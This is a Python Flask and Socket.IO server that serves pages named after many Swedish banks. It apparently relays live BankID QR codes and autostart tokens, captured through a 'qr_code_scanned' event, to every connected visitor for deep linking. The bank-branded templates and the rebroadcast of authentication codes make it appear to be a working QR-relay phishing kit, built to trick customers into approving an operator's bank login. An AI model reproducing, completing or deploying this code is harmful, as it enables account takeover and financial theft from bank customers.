from flask import Flask, render_template
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO
import uuid

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')

# Store for QR data - in production this would be a database
qr_sessions = {}

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/danske.html')
def danske():
    return render_template('danske.html')

@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')

@app.route('/ica.html')
def ica():
    return render_template('ica.html')

@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')

@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')

@app.route('/seb.html')
def seb():
    return render_template('seb.html')

@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')

@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')

@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')

@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")   
    
    # Generate a unique session ID
    session_id = str(uuid.uuid4())
    
    # Store the QR data with the session ID
    qr_sessions[session_id] = qr_data
    
    # Extract autostart token if QR data is in BankID format
    autostart_token = None
    if qr_data and qr_data.startswith('bankid.'):
        # Parse the QR data format: bankid.token.time.authcode
        parts = qr_data.split('.')
        if len(parts) >= 4:
            autostart_token = parts[1]
            print(f"[Debug] Extracted autostart token: {autostart_token}")
    
    # Generate QR image
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,  
        box_size=10,
        border=4,
    )

    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    # Send QR image along with all necessary data for deep linking
    socketio.emit("update_qr_code_image", {
        'qr_image': img_base64,
        'qr_code_data': qr_data,  # Using the expected parameter name
        'session_id': session_id,
        'autostarttoken': autostart_token  # Include the token if available
    })

@socketio.on('request_qr_data')
def handle_request_qr_data():
    # Generate a new session ID
    session_id = str(uuid.uuid4())
    
    # Emit the session ID to the client
    socketio.emit('qr_data', {
        'status': 'waiting_for_scan',
        'session_id': session_id
    })

@socketio.on('request_fresh_qr_data')
def handle_fresh_qr_data_request():
    # Find the most recent QR session
    most_recent_session_id = None
    most_recent_qr_data = ""
    
    if qr_sessions:
        # Just get the last added session (assuming keys are chronological)
        most_recent_session_id = list(qr_sessions.keys())[-1]
        most_recent_qr_data = qr_sessions[most_recent_session_id]
    
    # Extract autostart token if QR data is in BankID format
    autostart_token = None
    if most_recent_qr_data and most_recent_qr_data.startswith('bankid.'):
        parts = most_recent_qr_data.split('.')
        if len(parts) >= 4:
            autostart_token = parts[1]
    
    # Send all necessary data for deep linking
    socketio.emit('qr_data', {
        'qrData': most_recent_qr_data,
        'session_id': most_recent_session_id,
        'token': autostart_token  # Send as token for bankid_token event handler
    })
    
    # Also send via bankid_token event for compatibility with client code
    if autostart_token:
        socketio.emit('bankid_token', {
            'token': autostart_token
        })

@socketio.on('start_qr_animation')
def handle_qr_animation(data):
    session_id = data.get('session_id')
    if session_id and session_id in qr_sessions:
        # This is where QR animation would be updated if needed
        pass

if __name__ == "__main__":
    # socketio.run(app, host='0.0.0.0', port=5000, debug=True)
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)

